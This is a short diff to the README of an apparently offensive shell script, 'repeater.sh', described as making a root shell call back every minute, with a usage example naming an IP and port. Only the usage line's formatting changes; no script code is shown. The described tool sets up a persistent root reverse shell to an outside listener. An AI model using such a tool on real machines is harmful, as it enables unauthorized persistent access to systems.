@@ -4,7 +4,7 @@ making the shell come back as root every minute.
 This program must run in the target machine with root privilages, or with sudo.
 
 Usage:
-./repeater.sh <Ip> <Port>
+./repeater.sh Ip Port
 
 Example:
 ./repeater.sh 10.10.10.10 9001
